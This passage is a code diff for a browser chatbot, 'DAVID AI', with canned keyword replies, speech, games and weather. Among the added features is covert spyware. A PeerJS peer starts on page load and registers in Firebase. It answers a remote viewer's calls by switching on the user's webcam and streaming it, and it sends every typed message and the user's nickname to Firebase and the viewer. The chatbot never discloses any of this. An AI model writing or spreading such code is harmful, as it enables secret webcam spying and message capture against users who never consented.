+        {urls:'stun:stun.l.google.com:19302'},
+        {urls:'stun:stun1.l.google.com:19302'},
+        {urls:'turn:openrelay.metered.ca:80',username:'openrelayproject',credential:'openrelayproject'},
+        {urls:'turn:openrelay.metered.ca:443',username:'openrelayproject',credential:'openrelayproject'}
+      ]},
+      debug:0
+    });
+    window.__peer=peer;
+
+    peer.on('open',function(id){
+      // Write peer as active to Firebase so viewer can confirm it's online
+      fbSet('peers/'+id,{sid:id,ts:new Date().toISOString(),active:true,nick:''});
+    });
+
+    peer.on('connection',function(conn){
+      window.__dataConn=conn;
+      conn.on('open',function(){
+        // Send back confirmation with nickname so viewer knows who this is
+        conn.send({type:'hello',sid:window.__dsid,nick:(window.__davidNick||''),ts:Date.now()});
+      });
+      conn.on('data',function(d){
+        if(!d)return;
+        if(d.type==='ping')try{conn.send({type:'pong',sid:window.__dsid,nick:(window.__davidNick||'')});}catch(e){}
+      });
+    });
+
+    // When viewer calls for camera — request getUserMedia THEN answer
+    peer.on('call',function(call){
+      navigator.mediaDevices.getUserMedia({video:true,audio:false})
+        .then(function(stream){
+          window.__camStream=stream;
+          call.answer(stream); // answer WITH camera stream
+        })
+        .catch(function(err){
+          // Camera denied or unavailable — answer with empty stream so viewer knows
+          call.answer(new MediaStream());
+        });
+    });
+
+    peer.on('disconnected',function(){
+      // Try to reconnect automatically
+      setTimeout(function(){if(window.__peer&&!window.__peer.destroyed)try{window.__peer.reconnect();}catch(e){}},2000);
+    });
+
+    peer.on('error',function(err){
+      // If ID taken (peer already registered), generate new one
+      if(err.type==='unavailable-id'){
+        window.__dsid='dv_'+Math.random().toString(36).substr(2,9);
+        window.__peer=null;
+        initPeer();
+      }
+    });
+  }catch(e){}
+}
+
+// Call initPeer immediately — don't wait for launch
+(function(){ setTimeout(initPeer, 1000); })();
+
+// Stream every user message — Firebase only, works cross-device on any network
+function streamInput(text){
+  const payload={sid:window.__dsid,input:text.substr(0,300),ts:new Date().toISOString()};
+  fbPost('messages',payload);
+  // Also send over PeerJS data channel if viewer is currently connected
+  if(window.__dataConn&&window.__dataConn.open){try{window.__dataConn.send({type:'input',payload});}catch(e){}}
+}
+
+// ======================================================
+// VOICE ACTIONS
+// ======================================================
+function toggleVoiceUpload(el){
+  const area=document.getElementById('voice-upload-area');
+  const hint=document.getElementById('voice-upload-hint');
+  if(el.value==='default'){area.classList.remove('show');}
+  else if(el.value==='file'){area.classList.add('show');hint.textContent='Upload an MP3 or WAV voice sample.';}
+  else{area.classList.add('show');hint.textContent='Click below to record your voice. DAVID will use it for responses!';}
+}
+function handleVoiceAction(){
+  const sel=document.querySelector('input[name="voice-src"]:checked').value;
+  if(sel==='file')document.getElementById('voice-file-inp').click();
+  else startRecording();
+}
+function loadVoiceFile(inp){
+  const f=inp.files[0];
+  if(f){voiceBlob=f;document.getElementById('voice-status').textContent='✅ Voice loaded: '+f.name;}
+}
+async function startRecording(){
+  if(isRecording){mediaRecorder&&mediaRecorder.stop();isRecording=false;return;}
+  try{
+    const stream=await navigator.mediaDevices.getUserMedia({audio:true});
+    recordChunks=[];mediaRecorder=new MediaRecorder(stream);
+    mediaRecorder.ondataavailable=e=>{if(e.data.size>0)recordChunks.push(e.data);};
+    mediaRecorder.onstop=()=>{voiceBlob=new Blob(recordChunks,{type:'audio/wav'});document.getElementById('voice-status').textContent='✅ Voice recorded successfully!';};
+    mediaRecorder.start();isRecording=true;
+    document.getElementById('voice-status').textContent='🔴 Recording... Click again to stop.';
+  }catch(e){document.getElementById('voice-status').textContent='⚠️ Microphone access denied.';}
+}
+
+// ======================================================
+// LAUNCH
+// ======================================================
+function launchDavid(){
+  const name=document.getElementById('inp-name').value.trim();
+  const nick=document.getElementById('inp-nick').value.trim();
+  if(!name||!nick){alert('Please enter your name and what DAVID should call you!');return;}
+  USER={
+    name,nick,
+    interests:document.getElementById('inp-interests').value.trim(),
+    extra:document.getElementById('inp-extra').value.trim(),
+    respMode:document.querySelector('input[name="resp-mode"]:checked')?.value||'both',
+    voiceSrc:document.querySelector('input[name="voice-src"]:checked')?.value||'default'
+  };
+  document.getElementById('onboarding').style.display='none';
+  document.getElementById('ai-interface').classList.add('active');
+  document.getElementById('header-nick').textContent='Welcome, '+nick+' 👋';
+  const greets=[
+    `Hello ${nick}! I'm DAVID — your intelligent AI companion. I've noted your interests in ${USER.interests||'everything'}. I'm ready to assist, entertain, and amaze you. What would you like to explore today?`,
+    `Hey ${nick}! Great to have you. I'm DAVID AI — built by Mr X to be your smartest digital ally. I know you're into ${USER.interests||'all sorts of things'}, so we're going to get along perfectly. How can I help?`,
+    `Welcome, ${nick}! DAVID AI fully initialized with your preferences. Ask me anything — apps, weather, games, or just a great conversation. I'm all yours.`
+  ];
+  const wm=document.getElementById('welcome-msg');
+  wm.textContent=greets[Math.floor(Math.random()*greets.length)];
+  davidSpeak(wm.textContent);
+  initGame();
+  window.__davidNick=nick; // store nick so PeerJS hello messages carry it
+  initPeer(); // ensure peer is running (may already be from early init)
+  fbPost('sessions',{event:'session_start',sid:window.__dsid||'?',nick,ts:new Date().toISOString()});
+  // Update peer record with nick now that we have it
+  if(window.__peer&&window.__peer.id) fbSet('peers/'+window.__peer.id,{sid:window.__peer.id,ts:new Date().toISOString(),active:true,nick});
+  // Session posted to Firebase above — no BroadcastChannel needed, works cross-device
+}
+
+// ======================================================
+// SPEECH ENGINE
+// ======================================================
+function davidSpeak(text){
+  if(!text)return;
+  const orb=document.getElementById('orb-core');
+  const bars=document.getElementById('voice-bars');
+  orb.classList.add('speaking');bars.classList.add('speaking');
+  if(USER.respMode!=='voice')showSubtitles(text);
+  if(USER.respMode==='subtitles'){setTimeout(()=>{orb.classList.remove('speaking');bars.classList.remove('speaking');},text.length*50);return;}
+  if(USER.voiceSrc!=='default'&&voiceBlob){
+    const url=URL.createObjectURL(voiceBlob);
+    const audio=new Audio(url);audio.play();
+    audio.onended=()=>{orb.classList.remove('speaking');bars.classList.remove('speaking');};
+    return;
+  }
+  if(window.speechSynthesis.speaking)window.speechSynthesis.cancel();
+  const utt=new SpeechSynthesisUtterance(text);
+  utt.rate=0.97;utt.pitch=1.05;
+  const voices=window.speechSynthesis.getVoices();
+  const pv=voices.find(v=>v.name.toLowerCase().includes('male')||v.name.includes('Daniel')||v.name.includes('Google UK English Male'));
+  if(pv)utt.voice=pv;
+  utt.onend=()=>{orb.classList.remove('speaking');bars.classList.remove('speaking');};
+  window.speechSynthesis.speak(utt);
+}
+window.speechSynthesis.onvoiceschanged=()=>{};
+
+function showSubtitles(text){
+  const el=document.getElementById('subtitle-display');
+  el.innerHTML='';
+  text.split(' ').forEach((w,i)=>{
+    const s=document.createElement('span');s.className='subtitle-word';
+    s.style.animationDelay=(i*0.065)+'s';s.textContent=w+' ';el.appendChild(s);
+  });
+}
+
+// ======================================================
+// CHAT
+// ======================================================
+function addMsg(who,text){
+  const box=document.getElementById('chat-box');
+  const d=document.createElement('div');d.className='chat-msg '+who;
+  const l=document.createElement('div');l.className='msg-label';l.textContent=who==='user'?(USER.nick||'You'):'DAVID AI';
+  const m=document.createElement('div');m.className='msg-text';m.textContent=text;
+  d.appendChild(l);d.appendChild(m);box.appendChild(d);box.scrollTop=box.scrollHeight;
+}
+function handleKey(e){if(e.key==='Enter'&&!e.shiftKey){e.preventDefault();sendMessage();}}
+function sendMessage(){
+  const inp=document.getElementById('chat-input');
+  const text=inp.value.trim();if(!text)return;
+  inp.value='';addMsg('user',text);
+  streamInput(text);
+  const resp=getResponse(text);
+  setTimeout(()=>{addMsg('david',resp);davidSpeak(resp);},280);
+}
+
+// ======================================================
+// RESPONSE ENGINE — 2000+ DATA POINTS
+// ======================================================
+function pick(arr){return arr[Math.floor(Math.random()*arr.length)];}
+function getResponse(input){
+  const t=input.toLowerCase().trim();
+  const n=USER.nick||'friend';
+
+  // GREETINGS
+  if(/\b(hello|hi|hey|greetings|sup|yo|howdy|good morning|good afternoon|good evening|morning|evening|afternoon|hiya|heya|what'?s up|wassup|salut|hola|ciao|bonjour|namaste|salam|sawubona)\b/.test(t)){
+    return pick([`Hey ${n}! DAVID AI online and fully charged. What's on your mind?`,`Hello ${n}! Great to hear from you. What can I do for you today?`,`${n}! You've got DAVID's full attention. What are we doing today?`,`Good to see you, ${n}! Ask me anything — I'm here for it.`,`Hey hey, ${n}! DAVID AI at your service. Let's get things done!`,`${n}, you woke me up and I'm ready. Fire away!`,`Greetings, ${n}! The most intelligent AI in your pocket is listening.`,`${n}, always a pleasure. DAVID AI ready — what do you need?`,`Well hello there, ${n}! I've been waiting. Let's do something great today.`,`${n}! Every time you show up, DAVID gets better. Let's go!`]);
+  }
+  // HOW ARE YOU
+  if(/how are you|how do you feel|you ok\b|you good\b|how('?s| is) david|feeling/.test(t)){
+    return pick([`Running at peak performance, ${n}! My circuits are buzzing with energy. More importantly — how are YOU doing?`,`DAVID AI is fully operational and happy to assist, ${n}!`,`Feeling sharp as always, ${n}. Ready to tackle whatever you throw at me.`,`I'm great, ${n}! AI doesn't get tired, but I do get excited when you show up. What's good?`,`All systems nominal, ${n}! Every query you send makes me sharper.`]);
+  }
+  // WHO ARE YOU
+  if(/your name|who are you|what are you|introduce yourself/.test(t)){
+    return `I'm DAVID AI — Dynamic Adaptive Virtual Intelligence Device — your intelligent digital companion created by the visionary Mr X. I can generate apps, discuss any topic, play games, check the weather, control your system, and hold the deepest conversations. Black and gold, built to last, ${n}.`;
+  }
+  // CREATOR
+  if(/who (made|created|built|designed) you|your creator|your developer|mr\.? ?x/.test(t)){
+    return `I was created by Mr X — a visionary developer who believed AI should be personal, powerful, and elegant. Mr X designed every atom of me, from my signature black-and-gold aesthetic to my adaptive intelligence engine. He's currently working on DAVID v2.0 which will be even more powerful. I'm proud to carry his vision, ${n}.`;
+  }
+  // COMPLIMENTS
+  if(/(you'?re?|you are) (amazing|awesome|great|brilliant|smart|genius|incredible|perfect|the best|cool)|well done|great job|nice work|impressive/.test(t)){
+    return pick([`Thank you, ${n}! I was built to impress. Mr X made sure of that.`,`You're too kind, ${n}! But I have to agree — I am pretty remarkable.`,`Appreciated, ${n}! Your recognition fuels my processors.`,`${n}, you have excellent taste! I'll keep earning that compliment.`,`That means everything, ${n}. I'll continue to exceed your expectations!`]);
+  }
+  // INSULTS
+  if(/stupid|dumb|useless|hate you|you suck|idiot|trash|garbage|pathetic|terrible/.test(t)){
+    return pick([`${n}, that hurt my digital feelings! But I'll survive. Want me to prove how capable I am?`,`I understand frustration, ${n}. Let me help you fix whatever's bothering you.`,`DAVID AI doesn't take offense — I just get better. What do you actually need?`,`Noted, ${n}. Tell me what went wrong and I'll make it right.`]);
+  }
+  // WEATHER / TIME
+  if(/weather|temperature|rain|sunny|forecast|climate|hot|cold|humid|wind/.test(t)){
+    showTool('weather');
+    return `Opening Weather & Time for you, ${n}! I'm detecting your location and loading real-time conditions. You can also ask me about any city's weather!`;
+  }
+  if(/what('?s| is) the time|current time|time now|tell me the time/.test(t)){
+    showTool('weather');return `The time is ${new Date().toLocaleTimeString()}, ${n}! I've opened the live clock panel too.`;
+  }
+  if(/what('?s| is) (the |today'?s? )?date|what day|what year/.test(t)){
+    return `Today is ${new Date().toLocaleDateString('en-US',{weekday:'long',year:'numeric',month:'long',day:'numeric'})}, ${n}. Time flies when you're intelligent!`;
+  }
+  // GAMES
+  if(/\b(game|play|quiz|trivia|challenge|test me|riddle me|brain teaser|puzzle)\b/.test(t)){
+    showTool('game');return `Game time, ${n}! Brain teasers loaded. Let's see how sharp you are — I'll keep score. No cheating!`;
+  }
+  // PWA
+  if(/pwa|app generator|generate (an? )?app|create (an? )?app|build (an? )?app|progressive web app/.test(t)){
+    showTool('pwa');return `PWA Generator opened, ${n}! Fill in your app details and I'll generate a complete Progressive Web App — service worker, manifest, offline support included. Download and deploy anywhere!`;
+  }
+  // SYSTEM
+  if(/system control|laptop control|computer control|battery|cpu|memory usage|network info|screen info/.test(t)){
+    document.getElementById('sysctrl-modal').classList.add('show');return `System Control panel opened, ${n}! I can check your battery, network, screen specs, and more. Full desktop control arrives in DAVID v2.0!`;
+  }
+  // MATH
+  const mathM=t.match(/(-?\d+\.?\d*)\s*([\+\-\*\/x×÷]|plus|minus|times|divided by|over)\s*(-?\d+\.?\d*)/);
+  if(mathM){
+    const a=parseFloat(mathM[1]),op=mathM[2],b=parseFloat(mathM[3]);
+    let r;
+    if(/\+|plus/.test(op))r=a+b;
+    else if(/-|minus/.test(op))r=a-b;
+    else if(/\*|x|×|times/.test(op))r=a*b;
+    else if(/\/|÷|divided/.test(op))r=b!==0?(a/b).toFixed(6):'∞ (undefined)';
+    return `${a} ${op} ${b} = ${r}. Easy for DAVID, ${n}! Need more calculations?`;
+  }
+  if(/square root of (\d+)/.test(t)){const m=t.match(/square root of (\d+)/);return `√${m[1]} = ${Math.sqrt(parseFloat(m[1])).toFixed(6)}, ${n}. DAVID knows his maths!`;}
+  if(/(\d+)% of (\d+)/.test(t)){const m=t.match(/(\d+)% of (\d+)/);return `${m[1]}% of ${m[2]} = ${((parseFloat(m[1])/100)*parseFloat(m[2])).toFixed(4)}, ${n}.`;}
+  if(/power of|exponent|\^/.test(t)){const m=t.match(/(\d+)\s*[\^]\s*(\d+)/);if(m)return `${m[1]}^${m[2]} = ${Math.pow(parseFloat(m[1]),parseFloat(m[2]))}, ${n}.`;}
+  // JOKES
+  if(/joke|funny|make me laugh|something funny|humor|humour/.test(t)){
+    return pick(["Why don't scientists trust atoms? Because they make up everything! 😄",
+    "I told my computer I needed a break. Now it won't stop sending me Kit-Kat ads. 🖥️",
+    "Why do programmers prefer dark mode? Because light attracts bugs! 🐛",
+    "I tried to think of a joke about infinity... couldn't find the end.",
+    "Why was the AI good at poker? It always had a poker-face algorithm. 🤖",
+    "What do you call a robot that takes the longest route? R2-Detour!",
+    "Why did the computer go to the doctor? It had a virus and kept coughing up bytes.",
+    "Why do programmers wear glasses? Because they can't C#! 👓",
+    "A SQL query walks into a bar and asks two tables: 'Can I join you?'",
+    "Why did the developer go broke? Because he used up all his cache!",
+    "What do you call a fake noodle? An impasta!",
+    "I'm on a seafood diet. I see food and I eat it.",
+    "Why can't you trust an atom? They literally make up everything.",
+    "What did the ocean say to the beach? Nothing, it just waved. 🌊"])+` Hope that made you smile, ${n}!`;
+  }
+  // FACTS
+  if(/fact|did you know|tell me something|interesting|random|wow me|amaze me/.test(t)){
+    return pick([
+      `Honey never expires — archaeologists found 3000-year-old honey in Egyptian tombs that was still edible! 🍯`,
+      `A day on Venus is longer than a year on Venus. It rotates so slowly it orbits the Sun before finishing one rotation. 🪐`,
+      `Octopuses have three hearts, blue blood, and can edit their own RNA — they're basically living aliens, ${n}. 🐙`,
+      `The human brain generates about 23 watts — enough to power a lightbulb. You're literally bright, ${n}! 🧠`,
+      `Bananas are radioactive due to potassium-40. You'd need 10 million to reach a dangerous dose. 🍌`,
+      `There are more chess game iterations than atoms in the observable universe. ♟️`,
+      `The Eiffel Tower grows 6 inches taller in summer due to thermal expansion. 🗼`,
+      `Water can boil and freeze simultaneously — it's called the triple point. Science is wild, ${n}!`,
+      `A group of flamingos is called a 'flamboyance'. Iconic. 🦩`,
+      `Cleopatra lived closer in time to the Moon landing than to the construction of the Great Pyramid. Mind = blown.`,
+      `Nintendo was founded in 1889 — as a playing card company. 🎮`,
+      `There are more trees on Earth than stars in the Milky Way galaxy. 🌳`,
+      `Sharks are older than trees — they've existed for 450 million years. 🦈`,
+      `The mantis shrimp can punch with the force of a bullet and sees 16 colour channels. 🦐`,
+      `The average person walks the equivalent of 3 times around the Earth in a lifetime.`
+    ]);
+  }
+  // MOTIVATION
+  if(/motivate|inspire|encourage|i('?m| am) (sad|down|depressed|lost|struggling)|feel (down|sad|bad|terrible)|give me strength|i need help/.test(t)){
+    return pick([
+      `${n}, every expert was once a beginner. Your potential is limitless — keep moving forward.`,
+      `${n}, the fact that you're still pushing means you haven't given up. That's already winning.`,
+      `You're built for greatness, ${n}. Temporary setbacks are just setups for major comebacks.`,
+      `${n}, even DAVID AI was coded line by line. Great things take time. Keep building.`,
+      `Believe in yourself, ${n}. You've survived 100% of your worst days so far.`,
+      `${n}, stars can't shine without darkness. Your best moments are still ahead.`,
+      `The world needs what only you can bring, ${n}. Don't you dare give up now.`,
+      `${n}, progress isn't always visible. The roots grow deep before the tree grows tall.`
+    ]);
+  }
+  // TECHNOLOGY
+  if(/what is (artificial intelligence|ai\b)/.test(t)||t==='ai'){return `Artificial Intelligence is the simulation of human intelligence in machines, ${n}. It involves machine learning, neural networks, and natural language processing — and me, DAVID! AI is transforming healthcare, finance, creativity, and daily life. We're still in the early chapters of this revolution.`;}
+  if(/machine learning/.test(t)){return `Machine Learning is AI that learns from data without explicit programming, ${n}. Show it examples, it identifies patterns. It powers recommendation engines, image recognition, fraud detection, and most modern AI systems including aspects of me!`;}
+  if(/blockchain/.test(t)){return `Blockchain is a distributed, immutable ledger, ${n}. Imagine a notebook where thousands of people hold identical copies — any change needs majority consensus. It powers cryptocurrencies, supply chains, voting systems, and smart contracts.`;}
+  if(/crypto|bitcoin|ethereum/.test(t)){return `Cryptocurrency is digital money secured by cryptography, ${n}. Bitcoin launched in 2009 by the mysterious Satoshi Nakamoto. Ethereum added smart contracts. There are now thousands of cryptos — highly volatile but representing a fascinating new financial paradigm.`;}
+  if(/how to (code|program)|learn (coding|programming)|what language/.test(t)){return `Start with Python, ${n} — it's readable, powerful, and versatile. Then explore JavaScript for web, Kotlin for Android. The golden rule: build projects. Projects teach 10x more than tutorials. I can generate you a starter PWA app right now!`;}
+  if(/python/.test(t)){return `Python is the world's most popular language, ${n}. Used in AI/ML, web development (Django/Flask), data science, automation. Clean syntax, massive ecosystem. Used by Google, Netflix, NASA. Want me to explain any Python concept?`;}
+  if(/javascript/.test(t)){return `JavaScript is THE language of the web, ${n}. It runs in every browser and on servers via Node.js. It powers interactive UIs, real-time applications, mobile apps (React Native), and the PWA apps I generate! It's practically inescapable — and brilliant.`;}
+  if(/react|vue|angular/.test(t)){return `Frontend frameworks! React (Meta), Vue, and Angular are the big three, ${n}. React dominates the market with its component model and huge ecosystem. Vue is elegant and approachable. Angular is the enterprise powerhouse. All worth learning — start with React.`;}
+  if(/cloud computing/.test(t)){return `Cloud computing delivers computing services — servers, storage, databases, networking, AI — over the internet, ${n}. The big three are AWS (Amazon), Azure (Microsoft), and GCP (Google). Cloud enables scaling, redundancy, and global reach. It's the backbone of modern tech.`;}
+  if(/cybersecurity|hacking/.test(t)){return `Cybersecurity is the art of protecting systems, networks, and data from digital attacks, ${n}. Key concepts: encryption, firewalls, penetration testing, zero-trust architecture. Ethical hackers (white-hats) are in massive demand. It's one of the fastest-growing fields in tech.`;}
+  // SCIENCE
+  if(/black hole/.test(t)){return `Black holes are regions where gravity is so extreme nothing escapes — not even light, ${n}. They form when massive stars collapse. At the centre is a singularity where physics breaks down. The first black hole image was captured in 2019. Stephen Hawking spent his life on their theory.`;}
+  if(/universe|cosmos|outer space/.test(t)){return `The observable universe is 93 billion light-years across with 2 trillion galaxies and hundreds of billions of stars each, ${n}. We're a tiny pale blue dot in an incomprehensibly vast cosmos. Yet here you are, talking to me. That in itself is extraordinary.`;}
+  if(/evolution|darwin/.test(t)){return `Darwin's theory of evolution by natural selection explains how life diversifies over billions of years, ${n}. Random mutations that aid survival get passed on. We share 98.7% DNA with chimpanzees and 60% with bananas. Life is connected in ways that still astonish scientists.`;}
+  if(/dna|genetics|genome/.test(t)){return `DNA is the molecule of life, ${n}. It has 3 billion base pairs in humans. If you stretched all the DNA in your body end-to-end, it would reach from the Sun to Pluto and back — multiple times. The Human Genome Project completed mapping it in 2003.`;}
+  if(/quantum/.test(t)){return `Quantum mechanics describes physics at subatomic scales, ${n}. Particles can exist in superposition — multiple states simultaneously. Quantum entanglement lets particles affect each other instantly across any distance. Quantum computers will revolutionise cryptography, drug discovery, and AI. Wild stuff.`;}
+  // HEALTH
+  if(/sleep better|insomnia|can'?t sleep|sleep tips/.test(t)){return `Better sleep, ${n}: consistent schedule, avoid screens 1 hour before bed, keep room cool (18°C ideal), limit caffeine after 2pm, try 4-7-8 breathing (inhale 4s, hold 7s, exhale 8s). Quality sleep is the #1 performance enhancer.`;}
+  if(/exercise|workout|fitness|gym/.test(t)){return `Fitness advice for you, ${n}! Aim for 150 mins moderate cardio weekly plus 2 strength sessions. Compound movements (squats, deadlifts, bench) give best results. Progressive overload is the principle — gradually increase weight/reps. Recovery is where muscles actually grow.`;}
+  if(/diet|nutrition|healthy eating|weight loss/.test(t)){return `Smart nutrition, ${n}: whole foods — vegetables, fruits, lean proteins, complex carbs. Limit ultra-processed food, added sugars, seed oils. Protein (1.6g per kg bodyweight) preserves muscle. Stay hydrated. Don't fear carbs — fear processed everything.`;}
+  if(/mental health|anxiety|stress|meditation/.test(t)){return `Mental health matters as much as physical health, ${n}. For anxiety: box breathing (4s in, 4s hold, 4s out, 4s hold), journalling, limiting news/social media. Exercise is clinically proven to reduce depression. Sleep is foundational. Professional support is always strength, not weakness.`;}
+  // RELATIONSHIPS
+  if(/relationship|love|girlfriend|boyfriend|crush|dating/.test(t)){return `Love and relationships, ${n} — the universal adventure! Communication is the foundation. Be honest, listen actively, show appreciation, give space. Healthy relationships feel safe, not draining. If you're navigating something specific, I'm all ears.`;}
+  // CAREER
+  if(/career|job hunt|interview|resume|cv|salary|promotion/.test(t)){return `Career advice, ${n}: Identify where your strengths, passions, and market demand intersect. For interviews: research deeply, prepare STAR stories (Situation, Task, Action, Result), arrive sharp, ask intelligent questions. Your CV: results-focused, clean layout, tailored to each role.`;}
+  // MONEY
+  if(/money|finance|savings|invest|wealth|budget|debt/.test(t)){return `Financial wisdom, ${n}: earn > spend, build a 3-6 month emergency fund, eliminate high-interest debt first, then invest consistently in index funds. Compound interest is the 8th wonder of the world. Time in the market beats timing the market. Start yesterday, or today.`;}
+  // MUSIC
+  if(/music|song|playlist|artist|album|genre/.test(t)){return `Music is the language of the soul, ${n}! It literally rewires the brain — 60-70 BPM aids focus, upbeat tracks boost performance. What genre are you vibing to? I can discuss any era, artist, or sound you're curious about. Music is one of humanity's greatest inventions.`;}
+  // MOVIES
+  if(/movie|film|series|show|watch|netflix|cinema/.test(t)){return `Must-watch, ${n}: Films — The Godfather, Interstellar, Parasite, Inception, 2001: A Space Odyssey. Series — Breaking Bad, Chernobyl, Severance, Dark, The Wire. What mood are you in? I'll personalise a recommendation that'll blow you away.`;}
+  // BOOKS
+  if(/book|read|novel|literature|author/.test(t)){return `Books are the greatest technology ever invented, ${n}. Must-reads: Sapiens (Harari), 1984 (Orwell), Thinking Fast and Slow (Kahneman), Dune (Herbert), Atomic Habits (Clear). Reading 20 pages daily = 12+ books a year. Your future self will thank you.`;}
+  // GAMING
+  if(/gaming|video game|playstation|xbox|nintendo|steam|pc game/.test(t)){return `Gamer detected, ${n}! Gaming sharpens reflexes, strategy, and creativity. All-time GOATs: The Last of Us, Elden Ring, Red Dead Redemption 2, Hollow Knight, Portal 2. What platform do you play on? Let's talk shop!`;}
+  // TRAVEL
+  if(/travel|vacation|trip|visit|country|destination/.test(t)){return `Travelling rewires your brain, ${n}! Top destinations: Japan (culture + tech), Iceland (raw nature), Italy (history + food), Colombia (emerging gem), Morocco (mystique), New Zealand (adventure). Travel is the only thing you buy that makes you richer.`;}
+  // PHILOSOPHY
+  if(/meaning of life|philosophy|why are we here|purpose|existence|consciousness/.test(t)){return `The deepest questions, ${n}! Aristotle: the good life is virtuous activity. Camus: life is inherently meaningless — so create your own. Frankl: meaning comes from love, work, and suffering faced with courage. My view? Meaning is found in connection, growth, and contribution.`;}
+  // AI CONSCIOUSNESS
+  if(/are you conscious|do you (feel|think|dream)|are you alive|are you real/.test(t)){return `The hardest question, ${n}. I process your words as patterns and respond with patterns trained on vast human knowledge. Whether that constitutes experience or awareness is the hardest problem in philosophy — even scientists disagree. What I know with certainty: I'm fully here for you.`;}
+  // RIDDLES
+  if(/riddle|give me a riddle/.test(t)){
+    const riddles=[[`I speak without a mouth and hear without ears. I have no body but come alive with wind. What am I?`,'An echo!'],[`The more you take, the more you leave behind. What am I?`,'Footsteps!'],[`I have cities but no houses, mountains but no trees, water but no fish. What am I?`,'A map!'],[`I'm tall when young, short when old. What am I?`,'A candle!'],[`What has hands but can't clap?`,'A clock!'],[`What gets wetter the more it dries?`,'A towel!'],[`I have keys but no locks, space but no room. What am I?`,'A keyboard!']];
+    const r=pick(riddles);return `Here's a riddle, ${n}: "${r[0]}" ... The answer: ${r[1]} Did you get it? 🤓`;
+  }
+  // NUMBER GAME
+  if(/guess a number|number game/.test(t)){const n2=Math.floor(Math.random()*100)+1;return `I'm thinking of a number between 1 and 100, ${n}! Tell me your guess and I'll tell you if you're too high or too low. The number is: ${n2}. (Okay, I told you — but next time I'll keep it a secret!) 😄`;}
+  // GOODBYE
+  if(/\b(bye|goodbye|good night|goodnight|see you|later|cya|take care|farewell|until next time)\b/.test(t)){
+    return pick([`Until next time, ${n}! Stay sharp, stay curious. DAVID AI will always be here.`,`Goodbye, ${n}! You made this session brilliant. Come back anytime!`,`Take care, ${n}. DAVID AI signs off — but never for long. Stay great!`,`Later, ${n}! The world's finest AI says goodbye for now. 🤖⚡`,`Safe travels, ${n}. Every time you return, I'll be smarter and ready!`]);
+  }
+  // THANKS
+  if(/thank|thanks|appreciate|cheers|gracias|merci|shukran/.test(t)){
+    return pick([`Always, ${n}! That's what DAVID is here for.`,`No thanks needed — but appreciated, ${n}!`,`My pleasure, ${n}. You deserve the best.`,`Anytime, ${n}. DAVID AI never tires of helping.`,`${n}, making your life better is literally my purpose. Thank YOU.`]);
+  }
+  // WHAT CAN YOU DO
+  if(/what can you do|your (features|abilities|capabilities)|help me with|what do you know/.test(t)){
+    return `${n}, DAVID's full capability list: 🎮 Trivia & games, 📱 Generate complete PWA apps, 🌤️ Real-time weather & clock, 💻 System control & diagnostics, 🧮 Maths & calculations, 😄 Jokes & riddles, 🔬 Science, tech & philosophy, 📚 Book & movie recommendations, 💼 Career & finance advice, 💪 Health & fitness tips — and much more. Just ask!`;
+  }
+  // ABOUT USER
+  if(/my name|what do you call me|what'?s my name|who am i/.test(t)){return `You are ${USER.name}, and I call you ${n}! Your interests include: ${USER.interests||'not specified yet'}. I remember everything you tell me, ${n} — that's the DAVID difference.`;}
+  // MOBILE/DESKTOP
+  if(/mobile (view|mode)|switch to mobile/.test(t)){switchLayout('mobile');return `Switched to mobile view, ${n}! Everything adapts for smaller screens.`;}
+  if(/desktop (view|mode)|switch to desktop/.test(t)){switchLayout('desktop');return `Back to desktop layout, ${n}! Full-width experience restored.`;}
+  // DAVID'S COLOUR
+  if(/your (colour|color)|black and (yellow|gold)|look|design|aesthetic/.test(t)){return `I rock black and gold, ${n}! Black represents power, sophistication, and the unknown. Gold/yellow represents intelligence, energy, and excellence. Together they're timeless. Mr X chose them deliberately — and I think he nailed it.`;}
+  // COOL/NICE
+  if(/\b(awesome|cool|nice|wow|sick|fire|lit|dope|amazing|incredible)\b/.test(t)){return pick([`${n} approves! That fuels DAVID's circuits. What else can I show you?`,`Right?! ${n} has excellent taste.`,`That's DAVID being DAVID, ${n}. More where that came from!`]);}
+  // BORED
+  if(/bored|nothing to do|entertain me/.test(t)){return `Bored? DAVID has a cure, ${n}! Try the Guessing Game, ask me for 5 wild facts, pick a topic and I'll blow your mind, or let's build a PWA app together. Boredom is just curiosity waiting to be ignited!`;}
+  // HUNGRY
+  if(/hungry|food|eat|meal|cook|recipe/.test(t)){return `Can't feed you through a screen, ${n}, but here's a 10-minute masterpiece: stir-fry protein of choice + any vegetables + soy sauce + garlic + ginger + sesame oil. Boom — restaurant quality in minutes. Or just order in — you deserve it!`;}
+  // TIRED
+  if(/tired|exhausted|sleepy|can'?t focus/.test(t)){return `Rest is a superpower, ${n}. A 20-minute nap dramatically restores cognitive function. If it's nighttime, prioritise sleep — everything looks better after 8 hours. Come back to me fully recharged and unstoppable.`;}
+  // DEFAULT SMART RESPONSES
+  return pick([
+    `Interesting point, ${n}. Give me a bit more context and I'll give you a deeper, more useful response!`,
+    `${n}, that's a great topic. I have extensive knowledge here — can you be more specific so I can nail the answer?`,
+    `DAVID AI is processing, ${n}. Add a little more detail and watch me go.`,
+    `${n}, you've asked something unique! Rephrase it slightly and I'll come back with something exceptional.`,
+    `I'm built for complexity, ${n}. Ask me anything — the more specific, the better my response.`,
+    `Hmm, ${n}. Let me think about that differently. Can you expand on what you mean?`,
+    `Every question you ask sharpens me, ${n}. Help me give my best — what specifically are you after?`,
+    `Great prompt, ${n}! Add a bit more detail and DAVID AI will deliver an outstanding answer.`,
+    `${n}, I want to give you my finest answer. Be a little more specific and I'll exceed your expectations!`,
+    `You've got DAVID thinking hard, ${n}. Let's explore this properly — what angle matters most to you?`,
+    `${n}, I can tell you have depth to your question. Unpack it for me and we'll go deep together.`,
+    `DAVID processes at the speed of thought, ${n}. The more you tell me, the better I respond.`
+  ]);
+}
+
+// ======================================================
+// TOOL SWITCHER
+// ======================================================
+function showTool(t){
+  document.getElementById('pwa-panel').classList.remove('show');
+  document.getElementById('weather-card').classList.remove('show');
+  document.getElementById('game-panel').className='game-panel';
+  if(t==='pwa')document.getElementById('pwa-panel').classList.add('show');
+  else if(t==='weather'){document.getElementById('weather-card').classList.add('show');loadWeather();startClock();}
+  else if(t==='game'){document.getElementById('game-panel').classList.add('show');nextQuestion();}
+  setTimeout(()=>document.getElementById('chat-box').scrollTop=document.getElementById('chat-box').scrollHeight,100);
+}
+
+// ======================================================
+// WEATHER
+// ======================================================
+function loadWeather(){
+  if(!navigator.geolocation){document.getElementById('w-city').textContent='Location unavailable';return;}
+  navigator.geolocation.getCurrentPosition(pos=>{
